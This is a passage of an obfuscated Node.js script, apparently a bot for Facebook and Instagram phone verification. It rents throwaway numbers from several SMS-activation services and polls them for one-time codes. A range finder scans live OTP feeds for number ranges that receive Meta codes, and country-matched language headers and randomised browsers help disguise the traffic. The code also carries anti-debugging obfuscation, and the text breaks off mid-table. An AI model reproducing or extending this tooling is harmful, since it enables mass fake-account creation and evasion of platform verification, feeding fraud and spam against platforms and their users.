const fs = require('fs'),
  path = require("path"),
  http = require("http"),
  https = require("https"),
  crypto = require("crypto"),
  zlib = require("zlib"),
  readline = require("readline"),
  net = require("net"),
  tls = require("tls");
let chalk;
try {
  chalk = require("chalk");
} catch (v121) {
  const id = v123 => v123,
    v122 = {};
  v122.hex = () => id, v122.white = id, v122.gray = id, v122.green = id, v122.red = id, v122.yellow = id, v122.cyan = id, v122.greenBright = id, v122.redBright = id, v122.bold = id, chalk = v122, chalk.hex = () => id, chalk.white.bold = id;
}
const B = chalk.hex("#4267B2"),
  C = chalk.hex("#1877F2"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B"),
  DIM = chalk.hex("#555555"),
  FB_CYAN = C,
  FB_GOLD = Y,
  FB_EMERALD = chalk.hex("#00FF88").bold,
  FB_AMBER = chalk.hex("#FF9900").bold,
  FB_PURPLE = chalk.hex("#A855F7").bold,
  FB_MUTED = DIM;
const uuid = () => crypto.randomUUID();
let FB_HOST = "www.facebook.com",
  SELECTED_LANG = "random";
const sleep = v124 => new Promise(v125 => setTimeout(v125, v124));
let SELECTED_BROWSER = "random",
  SELECTED_BROWSERS = ["random"];
function setSelectedBrowsers(v126) {
  if (Array.isArray(v126)) {
    if (v126.length === 0x0) SELECTED_BROWSERS = ["random"], SELECTED_BROWSER = "random";else v126.length === 0x1 ? (SELECTED_BROWSERS = [v126[0x0]], SELECTED_BROWSER = v126[0x0]) : (SELECTED_BROWSERS = [...v126], SELECTED_BROWSER = v126.join('+'));
  } else {
    if (typeof v126 === "string") {
      const v127 = v126.split(/[+,]+/).map(v128 => v128.trim()).filter(Boolean);
      if (v127.length > 0x1) SELECTED_BROWSERS = v127, SELECTED_BROWSER = v127.join('+');else v127.length === 0x1 ? (SELECTED_BROWSERS = [v127[0x0]], SELECTED_BROWSER = v127[0x0]) : (SELECTED_BROWSERS = ["random"], SELECTED_BROWSER = "random");
    }
  }
}
class NexaRateLimiter {
  constructor(v129) {
    this.delayMs = v129, this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v130) {
    return new Promise((v131, v132) => {
      this.queue.push(async () => {
        try {
          v131(await v130());
        } catch (v133) {
          v132(v133);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v134 = this.queue.shift();
      await v134(), await new Promise(v135 => setTimeout(v135, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v136) {
  return new Promise((v137, v138) => {
    const v139 = {};
    v139.Accept = "text/plain", v139.Connection = "close";
    const v140 = {};
    v140.hostname = "smsbower.page";
    v140.port = 0x1bb, v140.path = "/stubs/handler_api.php?" + v136, v140.method = "GET", v140.headers = v139;
    const v141 = v140,
      v142 = https.request(v141, v143 => {
        let v144 = '';
        v143.on("data", v145 => v144 += v145);
        v143.on("end", () => v137(v144.trim()));
      });
    v142.on("error", v146 => v138(new Error("SmsBower net: " + v146.message))), v142.setTimeout(0x3a98, () => {
      v142.destroy();
      v138(new Error("SmsBower timeout"));
    }), v142.end();
  });
}
function smsBowerFetchNumber(v147, v148, v149, v150) {
  let v151 = "api_key=" + encodeURIComponent(v147) + "&action=getNumber&service=" + encodeURIComponent(v148 || 'fb');
  v149 && String(v149).trim() !== '0' && String(v149).trim() !== '' && (v151 += "&country=" + encodeURIComponent(v149));
  v150 && parseFloat(v150) > 0x0 && (v151 += "&maxPrice=" + encodeURIComponent(v150));
  return smsBowerRequest(v151).then(v152 => {
    if (v152.startsWith("ACCESS_NUMBER:")) {
      const v153 = v152.split(':');
      return {
        'activationId': v153[0x1],
        'phoneNumber': v153[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v152);
  });
}
function smsBowerPollOtp(v154, v155, v156 = 0x927c0) {
  return new Promise(v157 => {
    const v158 = Date.now() + v156,
      fn3 = () => {
        smsBowerRequest("api_key=" + encodeURIComponent(v154) + "&action=getStatus&id=" + v155).then(v159 => {
          if (v159.startsWith("STATUS_OK:")) {
            v157(v159.replace("STATUS_OK:", '').trim());
            return;
          }
          if (v159.startsWith("STATUS_WAIT_RETRY:")) {
            const v160 = v159.replace("STATUS_WAIT_RETRY:", '').trim();
            if (v160 && /^\d{4,8}$/.test(v160)) {
              v157(v160);
              return;
            }
          }
          if (v159 === "STATUS_CANCEL" || v159 === "NO_ACTIVATION") {
            v157(null);
            return;
          }
          if (Date.now() < v158) setTimeout(fn3, 0xfa0);else v157(null);
        }).catch(() => {
          if (Date.now() < v158) setTimeout(fn3, 0xfa0);else v157(null);
        });
      };
    fn3();
  });
}
function smsBowerSetStatus(v161, v162, v163) {
  return smsBowerRequest("api_key=" + encodeURIComponent(v161) + "&action=setStatus&id=" + v162 + "&status=" + v163).catch(() => null);
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v164, v165) {
  return new Promise((v166, v167) => {
    const v168 = {};
    v168.range = v165, v168.is_national = false;
    v168.remove_plus = false;
    const v169 = JSON.stringify(v168),
      v170 = {
        'hostname': "api.zenexnetwork.com",
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v164,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v169)
        }
      },
      v171 = https.request(v170, v172 => {
        let v173 = '';
        v172.on("data", v174 => v173 += v174), v172.on("end", () => {
          try {
            const v175 = JSON.parse(v173);
            if (v175?.["meta"]?.["code"] === 0xc8 && v175?.["data"]?.["full_number"]) v166(v175.data.full_number.replace(/[^0-9]/g, ''));else v167(new Error(v175?.["message"] || "Zenex: no number"));
          } catch (v176) {
            v167(new Error("Zenex: invalid JSON"));
          }
        });
      });
    v171.on("error", v177 => v167(new Error("Zenex net: " + v177.message))), v171.setTimeout(0x3a98, () => {
      v171.destroy();
      v167(new Error("Zenex timeout"));
    });
    v171.write(v169), v171.end();
  });
}
function zenexPollOtp(v178, v179, v180 = 0x927c0) {
  return new Promise(v181 => {
    const v182 = String(v179).replace(/[^0-9]/g, ''),
      v183 = Date.now() + v180,
      v184 = new Set(),
      fn4 = () => {
        const v185 = {};
        v185.mapikey = v178;
        const v186 = {};
        v186.hostname = "api.zenexnetwork.com", v186.port = 0x1bb, v186.path = "/v1/numsuccess/info", v186.method = "GET";
        v186.headers = v185;
        const v187 = v186,
          v188 = https.request(v187, v189 => {
            let v190 = '';
            v189.on("data", v191 => v190 += v191), v189.on("end", () => {
              try {
                const v192 = JSON.parse(v190),
                  v193 = Array.isArray(v192?.["data"]?.["otps"]) ? v192.data.otps : Array.isArray(v192?.["data"]) ? v192.data : [];
                for (const v194 of v193) {
                  const v195 = String(v194.number || v194.copy || '').replace(/[^0-9]/g, '');
                  if (!v195) continue;
                  const v196 = v195.length >= 0x6 && v182.length >= 0x6 ? v195.slice(-8) === v182.slice(-8) || v195.endsWith(v182) || v182.endsWith(v195) : false;
                  if (v196) {
                    const v197 = v194.nid || v195 + '_' + (v194.otp || '');
                    if (!v184.has(v197)) {
                      const v198 = String(v194.otp || '').match(/\b(\d{4,8})\b/);
                      if (v198) {
                        v181(v198[0x1]);
                        return;
                      }
                    }
                  }
                }
              } catch (v199) {}
              if (Date.now() < v183) setTimeout(fn4, 0xfa0);else v181(null);
            });
          });
        v188.on("error", () => {
          if (Date.now() < v183) setTimeout(fn4, 0xfa0);else v181(null);
        }), v188.end();
      };
    fn4();
  });
}
function nexaFetchNumber(v200, v201, v202) {
  return new Promise((v203, v204) => {
    const v205 = {};
    v205.range = v201, v205.format = "normal";
    const v206 = JSON.stringify(v205),
      v207 = {
        'hostname': "nexaotpservice.com",
        'port': 0x1bb,
        'path': v202 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v200,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v206)
        }
      },
      v208 = https.request(v207, v209 => {
        let v210 = '';
        v209.on("data", v211 => v210 += v211);
        v209.on("end", () => {
          try {
            const v212 = JSON.parse(v210);
            v212.success && v212.number ? v203(v212.number.replace(/[^0-9]/g, '')) : v204(new Error(v212.error || "NexaOTP: No number returned"));
          } catch (v213) {
            v204(new Error("NexaOTP: Invalid response"));
          }
        });
      });
    v208.on("error", v214 => v204(new Error("NexaOTP network: " + v214.message)));
    v208.setTimeout(0x2710, () => {
      v208.destroy();
      v204(new Error("NexaOTP: Timeout"));
    });
    v208.write(v206), v208.end();
  });
}
const twoOoLimiter = new NexaRateLimiter(0x1f4);
function stripRid(v215) {
  return v215.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v216, v217, v218) {
  return new Promise((v219, v220) => {
    const v221 = stripRid(v217),
      v222 = {};
    v222.rid = v221;
    const v223 = JSON.stringify(v222),
      v224 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v218,
        'method': "POST",
        'headers': {
          'mauthapi': v216,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v223)
        }
      },
      v225 = https.request(v224, v226 => {
        let v227 = '';
        v226.on("data", v228 => v227 += v228);
        v226.on("end", () => {
          try {
            const v229 = JSON.parse(v227);
            if (v229?.["meta"]?.["code"] === 0xc8 && v229?.["data"]?.["no_plus_number"]) v219(v229.data.no_plus_number);else v220(new Error(v229?.["message"] || v229?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v230) {
            v220(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v225.on("error", v231 => v220(new Error("2oo9 network: " + v231.message)));
    v225.setTimeout(0x2710, () => {
      v225.destroy();
      v220(new Error("2oo9: Timeout"));
    }), v225.write(v223), v225.end();
  });
}
function twoOoFetchConsole(v232, v233) {
  return new Promise((v234, v235) => {
    const v236 = {};
    v236.mauthapi = v232;
    const v237 = {};
    v237.hostname = "api.2oo9.cloud", v237.port = 0x1bb;
    v237.path = v233, v237.method = "GET";
    v237.headers = v236;
    const v238 = v237,
      v239 = https.request(v238, v240 => {
        let v241 = '';
        v240.on("data", v242 => v241 += v242), v240.on("end", () => {
          try {
            const v243 = JSON.parse(v241);
            if (v243?.["meta"]?.["code"] === 0xc8 && Array.isArray(v243?.["data"]?.["hits"])) v234(v243.data.hits);else v235(new Error(v243?.["message"] || "Console fetch failed"));
          } catch (v244) {
            v235(new Error("Console: Invalid JSON"));
          }
        });
      });
    v239.on("error", v245 => v235(new Error("Console network: " + v245.message))), v239.setTimeout(0x2710, () => {
      v239.destroy();
      v235(new Error("Console timeout"));
    }), v239.end();
  });
}
function parseTwoOoRangeSelection(v246, v247) {
  const v248 = new Set();
  const v249 = v246.split(/[\s,]+/).filter(v250 => v250);
  for (const v251 of v249) {
    const v252 = v251.match(/^(\d+)-(\d+)$/);
    if (v252) for (let v253 = +v252[0x1]; v253 <= +v252[0x2]; v253++) {
      if (v253 >= 0x1 && v253 <= v247) v248.add(v253 - 0x1);
    } else {
      const v254 = parseInt(v251);
      if (!isNaN(v254) && v254 >= 0x1 && v254 <= v247) v248.add(v254 - 0x1);
    }
  }
  return [...v248].sort((v255, v256) => v255 - v256);
}
async function autoRangeFinderFor2Oo(v257, v258, v259, v260) {
  const v261 = {};
  v261.facebook = ["facebook", 'fb'], v261.instagram = ["instagram", 'ig'], v261.meta = ["meta"], v261.all = ["facebook", 'fb', "instagram", 'ig', "meta"];
  const v262 = v261,
    v263 = {};
  v263.facebook = "📘 Facebook", v263.instagram = "📸 Instagram";
  v263.meta = "🌐 Meta", v263.all = "📦 All (FB+IG+Meta)";
  const v264 = v263;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v265 = [];
  try {
    v265 = await twoOoFetchConsole(v257, v258);
  } catch (v277) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v277.message + '\x0a')), null;
  }
  const v266 = v265.slice(0x0, 0x64);
  if (v266.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v267 = {};
  v267.name = "📸 Instagram", v267.value = "instagram";
  const v268 = {};
  v268.name = "🌐 Meta", v268.value = "meta";
  const v269 = await v259("Filter by app:", [{
      'name': "📘 Facebook",
      'value': "facebook"
    }, v267, v268, {
      'name': "📦 All (FB+IG+Meta)",
      'value': "all"
    }]),
    v270 = v262[v269];
  const v271 = v266.filter(v278 => {
    const v279 = (v278.sid || '').toLowerCase(),
      v280 = (v278.message || '').toLowerCase();
    return v270.some(v281 => v279.includes(v281) || v280.includes(v281));
  });
  if (v271.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v272 = {},
    v273 = {};
  for (const v282 of v271) {
    const v283 = v282.range || '';
    if (!v283) continue;
    v272[v283] = (v272[v283] || 0x0) + 0x1;
    const v284 = {};
    v284.facebook = 0x0, v284.instagram = 0x0, v284.meta = 0x0, v273[v283] = v273[v283] || v284;
    if (v262.facebook.some(v285 => (v282.sid || '').toLowerCase().includes(v285) || (v282.message || '').toLowerCase().includes(v285))) v273[v283].facebook++;
    if (v262.instagram.some(v286 => (v282.sid || '').toLowerCase().includes(v286) || (v282.message || '').toLowerCase().includes(v286))) v273[v283].instagram++;
    if (v262.meta.some(v287 => (v282.sid || '').toLowerCase().includes(v287) || (v282.message || '').toLowerCase().includes(v287))) v273[v283].meta++;
  }
  const v274 = Object.entries(v272).sort((v288, v289) => v289[0x1] - v288[0x1]).slice(0x0, 0x5);
  if (v274.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v275 = {};
  v275.name = "⚡ Auto detect & send (#1 range)", v275.value = "auto";
  const v276 = await v259("Range Finder mode:", [v275, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v276 === "auto") {
    const [v290, v291] = v274[0x0],
      v292 = v273[v290] || {},
      v293 = [];
    if (v292.facebook) v293.push("📘FB(" + v292.facebook + ')');
    if (v292.instagram) v293.push("📸IG(" + v292.instagram + ')');
    if (v292.meta) v293.push("🌐Meta(" + v292.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v290 + "  (" + v291 + " hits)  " + v293.join('\x20') + '\x0a')), [v290];
  } else {
    console.log(chalk.cyan("\n  App: " + v264[v269] + "  |  Scanned: " + v271.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v274.forEach(([v297, v298], v299) => {
      const v300 = v273[v297] || {},
        v301 = [];
      if (v300.facebook) v301.push("📘FB(" + v300.facebook + ')');
      if (v300.instagram) v301.push("📸IG(" + v300.instagram + ')');
      if (v300.meta) v301.push("🌐Meta(" + v300.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v299 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v297.padEnd(0x10)) + chalk.yellow(String(v298).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v298, 0xc)) + '\x20\x20') + (v301.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v294 = await v260("Select ranges:", ''),
      v295 = parseTwoOoRangeSelection(v294, v274.length);
    if (v295.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v296 = v295.map(v302 => v274[v302][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v296.join(',\x20') + '\x0a')), v296;
  }
}
let dataBytesTotal = 0x0;
function trackBytes(v303) {
  dataBytesTotal += v303;
}
function dataMB() {
  return (dataBytesTotal / 0x400 / 0x400).toFixed(0x2);
}
const DEBUG_LOG = true;
(function () {
  let v304;
  try {
    const v305 = Function('return (function() {}.constructor("return this")( ));');
    v304 = v305();
  } catch (v306) {
    v304 = window;
  }
  v304.setInterval(fn2, 0xdac);
})();
const DEBUG_TXT_FILE = require("path").join(__dirname, "debug.txt"),
  CONFIRM_DEBUG_FILE = require("path").join(__dirname, "confirm_debug.txt");
function dbg(v307) {
  if (!DEBUG_LOG) return;
  const v308 = '[' + new Date().toISOString() + ']\x20' + v307 + '\x0a';
  try {
    fs.appendFileSync(DEBUG_TXT_FILE, v308);
  } catch (v309) {}
}
function cdbg(v310) {
  if (!DEBUG_LOG) return;
  const v311 = '[' + new Date().toISOString() + ']\x20' + v310 + '\x0a';
  try {
    fs.appendFileSync(CONFIRM_DEBUG_FILE, v311);
  } catch (v312) {}
}
const v1 = {};
v1.US = "en-US,en;q=0.9", v1.CA = "en-CA,en;q=0.9,fr-CA;q=0.8", v1.MX = "es-MX,es;q=0.9,en;q=0.8", v1.BR = "pt-BR,pt;q=0.9,en;q=0.8", v1.AR = "es-AR,es;q=0.9,en;q=0.8", v1.CO = "es-CO,es;q=0.9", v1.CL = "es-CL,es;q=0.9", v1.PE = "es-PE,es;q=0.9", v1.VE = "es-VE,es;q=0.9", v1.EC = "es-EC,es;q=0.9", v1.BO = "es-BO,es;q=0.9", v1.PY = "es-PY,es;q=0.9", v1.UY = "es-UY,es;q=0.9", v1.CU = "es-CU,es;q=0.9", v1.DO = "es-DO,es;q=0.9", v1.GT = "es-GT,es;q=0.9", v1.HN = "es-HN,es;q=0.9", v1.SV = "es-SV,es;q=0.9", v1.NI = "es-NI,es;q=0.9", v1.CR = "es-CR,es;q=0.9", v1.PA = "es-PA,es;q=0.9", v1.JM = "en-JM,en;q=0.9", v1.TT = "en-TT,en;q=0.9", v1.BB = "en-BB,en;q=0.9", v1.GY = "en-GY,en;q=0.9", v1.SR = "nl-SR,nl;q=0.9,en;q=0.8", v1.HT = "fr-HT,fr;q=0.9,ht;q=0.8", v1.PR = "es-PR,es;q=0.9,en;q=0.8", v1.BZ = "en-BZ,en;q=0.9", v1.GB = "en-GB,en;q=0.9", v1.IE = "en-IE,en;q=0.9", v1.FR = "fr-FR,fr;q=0.9,en;q=0.8", v1.DE = "de-DE,de;q=0.9,en;q=0.8", v1.ES = "es-ES,es;q=0.9,en;q=0.8", v1.IT = "it-IT,it;q=0.9,en;q=0.8", v1.PT = "pt-PT,pt;q=0.9,en;q=0.8", v1.NL = "nl-NL,nl;q=0.9,en;q=0.8", v1.BE = "nl-BE,nl;q=0.9,fr-BE;q=0.8", v1.CH = "de-CH,de;q=0.9,fr-CH;q=0.8,it-CH;q=0.7", v1.AT = "de-AT,de;q=0.9", v1.LU = "fr-LU,fr;q=0.9", v1.SE = "sv-SE,sv;q=0.9,en;q=0.8", v1.NO = "nb-NO,nb;q=0.9,en;q=0.8", v1.DK = "da-DK,da;q=0.9,en;q=0.8", v1.FI = "fi-FI,fi;q=0.9,en;q=0.8", v1.IS = "is-IS,is;q=0.9,en;q=0.8", v1.PL = "pl-PL,pl;q=0.9,en;q=0.8", v1.CZ = "cs-CZ,cs;q=0.9,en;q=0.8", v1.SK = "sk-SK,sk;q=0.9,en;q=0.8", v1.HU = "hu-HU,hu;q=0.9,en;q=0.8", v1.RO = "ro-RO,ro;q=0.9,en;q=0.8", v1.BG = "bg-BG,bg;q=0.9,en;q=0.8", v1.HR = "hr-HR,hr;q=0.9,en;q=0.8", v1.SI = "sl-SI,sl;q=0.9,en;q=0.8", v1.BA = "bs-BA,bs;q=0.9,hr;q=0.8", v1.RS = "sr-RS,sr;q=0.9,en;q=0.8", v1.AL = "sq-AL,sq;q=0.9,en;q=0.8", v1.MK = "mk-MK,mk;q=0.9,en;q=0.8", v1.GR = "el-GR,el;q=0.9,en;q=0.8", v1.CY = "el-CY,el;q=0.9,en;q=0.8", v1.TR = "tr-TR,tr;q=0.9,en;q=0.8", v1.RU = "ru-RU,ru;q=0.9,en;q=0.8", v1.UA = "uk-UA,uk;q=0.9,ru;q=0.8", v1.BY = "be-BY,be;q=0.9,ru;q=0.8", v1.MD = "ro-MD,ro;q=0.9,ru;q=0.8", v1.LT = "lt-LT,lt;q=0.9,en;q=0.8", v1.LV = "lv-LV,lv;q=0.9,en;q=0.8", v1.EE = "et-EE,et;q=0.9,en;q=0.8", v1.AM = "hy-AM,hy;q=0.9,en;q=0.8", v1.GE = "ka-GE,ka;q=0.9,en;q=0.8", v1.AZ = "az-AZ,az;q=0.9,en;q=0.8", v1.KZ = "kk-KZ,kk;q=0.9,ru;q=0.8", v1.MT = "mt-MT,mt;q=0.9,en;q=0.8", v1.ME = "sr-ME,sr;q=0.9", v1.XK = "sq-XK,sq;q=0.9", v1.LI = "de-LI,de;q=0.9", v1.MC = "fr-MC,fr;q=0.9", v1.SM = "it-SM,it;q=0.9", v1.VA = "it-VA,it;q=0.9", v1.AD = "ca-AD,ca;q=0.9,es;q=0.8", v1.SA = "ar-SA,ar;q=0.9,en;q=0.8", v1.AE = "ar-AE,ar;q=0.9,en;q=0.8", v1.QA = "ar-QA,ar;q=0.9,en;q=0.8", v1.KW = "ar-KW,ar;q=0.9,en;q=0.8", v1.BH = "ar-BH,ar;q=0.9,en;q=0.8", v1.OM = "ar-OM,ar;q=0.9,en;q=0.8", v1.YE = "ar-YE,ar;q=0.9", v1.IQ = "ar-IQ,ar;q=0.9", v1.SY = "ar-SY,ar;q=0.9", v1.JO = "ar-JO,ar;q=0.9,en;q=0.8", v1.LB = "ar-LB,ar;q=0.9,fr;q=0.8", v1.IL = "he-IL,he;q=0.9,en;q=0.8", v1.IR = "fa-IR,fa;q=0.9,en;q=0.8", v1.PS = "ar-PS,ar;q=0.9", v1.IN = "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7", v1.PK = "ur-PK,ur;q=0.9,en;q=0.8", v1.BD = "bn-BD,bn;q=0.9,en;q=0.8", v1.LK = "si-LK,si;q=0.9,en;q=0.8", v1.NP = "ne-NP,ne;q=0.9,en;q=0.8", v1.CN = "zh-CN,zh;q=0.9,en;q=0.8", v1.TW = "zh-TW,zh;q=0.9,en;q=0.8", v1.HK = "zh-HK,zh;q=0.9,en;q=0.8", v1.JP = "ja-JP,ja;q=0.9,en;q=0.8", v1.KR = "ko-KR,ko;q=0.9,en;q=0.8", v1.VN = "vi-VN,vi;q=0.9,en;q=0.8", v1.TH = "th-TH,th;q=0.9,en;q=0.8", v1.MY = "ms-MY,ms;q=0.9,en;q=0.8", v1.SG = "en-SG,en;q=0.9,zh;q=0.8", v1.ID = "id-ID,id;q=0.9,en;q=0.8", v1.PH = "fil-PH,fil;q=0.9,en;q=0.8", v1.MM = "my-MM,my;q=0.9,en;q=0.8", v1.KH = "km-KH,km;q=0.9,en;q=0.8", v1.LA = "lo-LA,lo;q=0.9,en;q=0.8", v1.MN = "mn-MN,mn;q=0.9", v1.AF = "ps-AF,ps;q=0.9,fa;q=0.8", v1.BT = "dz-BT,dz;q=0.9,en;q=0.8", v1.MV = "dv-MV,dv;q=0.9,en;q=0.8", v1.TL = "pt-TL,pt;q=0.9,en;q=0.8", v1.PG = "en-PG,en;q=0.9", v1.FJ = "en-FJ,en;q=0.9", v1.AU = "en-AU,en;q=0.9", v1.NZ = "en-NZ,en;q=0.9", v1.UZ = "uz-UZ,uz;q=0.9,ru;q=0.8", v1.TM = "tk-TM,tk;q=0.9,ru;q=0.8", v1.TJ = "tg-TJ,tg;q=0.9,ru;q=0.8", v1.KG = "ky-KG,ky;q=0.9,ru;q=0.8", v1.NG = "en-NG,en;q=0.9", v1.GH = "en-GH,en;q=0.9", v1.KE = "sw-KE,sw;q=0.9,en;q=0.8", v1.TZ = "sw-TZ,sw;q=0.9,en;q=0.8", v1.UG = "en-UG,en;q=0.9", v1.ZA = "en-ZA,en;q=0.9,af;q=0.8", v1.ET = "am-ET,am;q=0.9,en;q=0.8", v1.EG = "ar-EG,ar;q=0.9,en;q=0.8", v1.DZ = "ar-DZ,ar;q=0.9,fr;q=0.8", v1.MA = "ar-MA,ar;q=0.9,fr;q=0.8", v1.TN = "ar-TN,ar;q=0.9,fr;q=0.8", v1.LY = "ar-LY,ar;q=0.9", v1.SD = "ar-SD,ar;q=0.9", v1.SO = "so-SO,so;q=0.9,ar;q=0.8", v1.CM = "fr-CM,fr;q=0.9,en;q=0.8", v1.CI = "fr-CI,fr;q=0.9", v1.SN = "fr-SN,fr;q=0.9", v1.ML = "fr-ML,fr;q=0.9", v1.BF = "fr-BF,fr;q=0.9", v1.GN = "fr-GN,fr;q=0.9", v1.NE = "fr-NE,fr;q=0.9", v1.TD = "fr-TD,fr;q=0.9,ar;q=0.8", v1.CF = "fr-CF,fr;q=0.9", v1.CD = "fr-CD,fr;q=0.9", v1.CG = "fr-CG,fr;q=0.9", v1.GA = "fr-GA,fr;q=0.9", v1.GQ = "es-GQ,es;q=0.9,fr;q=0.8", v1.ST = "pt-ST,pt;q=0.9", v1.AO = "pt-AO,pt;q=0.9", v1.MZ = "pt-MZ,pt;q=0.9", v1.ZM = "en-ZM,en;q=0.9", v1.ZW = "en-ZW,en;q=0.9", v1.MW = "en-MW,en;q=0.9", v1.NA = "en-NA,en;q=0.9,af;q=0.8", v1.BW = "en-BW,en;q=0.9", v1.LS = "en-LS,en;q=0.9", v1.SZ = "en-SZ,en;q=0.9", v1.RW = "rw-RW,rw;q=0.9,fr;q=0.8,en;q=0.7", v1.BI = "fr-BI,fr;q=0.9", v1.MG = "mg-MG,mg;q=0.9,fr;q=0.8", v1.KM = "ar-KM,ar;q=0.9,fr;q=0.8", v1.MU = "en-MU,en;q=0.9,fr;q=0.8", v1.SC = "fr-SC,fr;q=0.9,en;q=0.8", v1.DJ = "fr-DJ,fr;q=0.9,ar;q=0.8", v1.ER = "ti-ER,ti;q=0.9,ar;q=0.8", v1.GW = "pt-GW,pt;q=0.9", v1.CV = "pt-CV,pt;q=0.9", v1.SL = "en-SL,en;q=0.9", v1.LR = "en-LR,en;q=0.9", v1.TG = "fr-TG,fr;q=0.9", v1.BJ = "fr-BJ,fr;q=0.9", v1.GM = "en-GM,en;q=0.9", v1.PW = "en-PW,en;q=0.9", v1.FM = "en-FM,en;q=0.9", v1.MH = "en-MH,en;q=0.9", v1.NR = "en-NR,en;q=0.9", v1.KI = "en-KI,en;q=0.9", v1.TV = "en-TV,en;q=0.9", v1.TO = "en-TO,en;q=0.9", v1.WS = "en-WS,en;q=0.9", v1.VU = "bi-VU,bi;q=0.9,fr;q=0.8,en;q=0.7", v1.SB = "en-SB,en;q=0.9";
const COUNTRY_LANG_MAP = v1;
function getPhoneLang(v313) {
  const v314 = detectCountry(v313);
  if (v314 && COUNTRY_LANG_MAP[v314]) return COUNTRY_LANG_MAP[v314];
  return "en-US,en;q=0.9";
}
const v2 = {};
v2['1'] = 'US', v2['20'] = 'EG', v2['27'] = 'ZA', v2['30'] = 'GR', v2['31'] = 'NL', v2['32'] = 'BE', v2['33'] = 'FR', v2['34'] = 'ES', v2['36'] = 'HU', v2['39'] = 'IT', v2['40'] = 'RO', v2['41'] = 'CH', v2['43'] = 'AT', v2['44'] = 'GB', v2['45'] = 'DK', v2['46'] = 'SE', v2['47'] = 'NO', v2['48'] = 'PL', v2['49'] = 'DE', v2['51'] = 'PE', v2['52'] = 'MX', v2['53'] = 'CU', v2['54'] = 'AR', v2['55'] = 'BR', v2['56'] = 'CL', v2['57'] = 'CO', v2['58'] = 'VE', v2['60'] = 'MY', v2['61'] = 'AU', v2['62'] = 'ID', v2['63'] = 'PH', v2['64'] = 'NZ', v2['65'] = 'SG', v2['66'] = 'TH', v2['81'] = 'JP', v2['82'] = 'KR', v2['84'] = 'VN', v2['86'] = 'CN', v2['90'] = 'TR', v2['91'] = 'IN', v2['92'] = 'PK', v2['93'] = 'AF', v2['94'] = 'LK', v2['95'] = 'MM', v2['98'] = 'IR', v2["212"] = 'MA', v2["213"] = 'DZ', v2["216"] = 'TN', v2["218"] = 'LY', v2["220"] = 'GM', v2["221"] = 'SN', v2["223"] = 'ML', v2["224"] = 'GN', v2["225"] = 'CI', v2["226"] = 'BF', v2["227"] = 'NE', v2["228"] = 'TG', v2["229"] = 'BJ', v2["230"] = 'MU', v2["231"] = 'LR', v2["232"] = 'SL', v2["233"] = 'GH', v2["234"] = 'NG', v2["235"] = 'TD', v2["236"] = 'CF', v2["237"] = 'CM', v2["240"] = 'GQ', v2["241"] = 'GA', v2["242"] = 'CG', v2["243"] = 'CD', v2["244"] = 'AO', v2["248"] = 'SC', v2["249"] = 'SD', v2["250"] = 'RW', v2["251"] = 'ET', v2["252"] = 'SO', v2["254"] = 'KE', v2["255"] = 'TZ', v2["256"] = 'UG', v2["257"] = 'BI', v2["258"] = 'MZ', v2["260"] = 'ZM', v2["261"] = 'MG', v2["263"] = 'ZW', v2["264"] = 'NA', v2["265"] = 'MW', v2["351"] = 'PT', v2["352"] = 'LU', v2["353"] = 'IE', v2["354"] = 'IS', v2["355"] = 'AL', v2["358"] = 'FI', v2["359"] = 'BG', v2["370"] = 'LT', v2["371"] = 'LV', v2["372"] = 'EE', v2["373"] = 'MD', v2["374"] = 'AM', v2["375"] = 'BY', v2["380"] = 'UA', v2["381"] = 'RS', v2["385"] = 'HR', v2["386"] = 'SI', v2["387"] = 'BA', v2["420"] = 'CZ', v2["421"] = 'SK', v2["591"] = 'BO', v2["593"] = 'EC', v2["595"] = 'PY', v2["598"] = 'UY', v2["852"] = 'HK', v2["855"] = 'KH', v2["856"] = 'LA', v2["880"] = 'BD', v2["886"] = 'TW', v2["960"] = 'MV', v2["961"] = 'LB', v2["962"] = 'JO', v2["963"] = 'SY', v2["964"] = 'IQ', v2["965"] = 'KW', v2["966"] = 'SA', v2["967"] = 'YE', v2["968"] = 'OM', v2["971"] = 'AE', v2["972"] = 'IL', v2["973"] = 'BH', v2["974"] = 'QA', v2["975"] = 'BT', 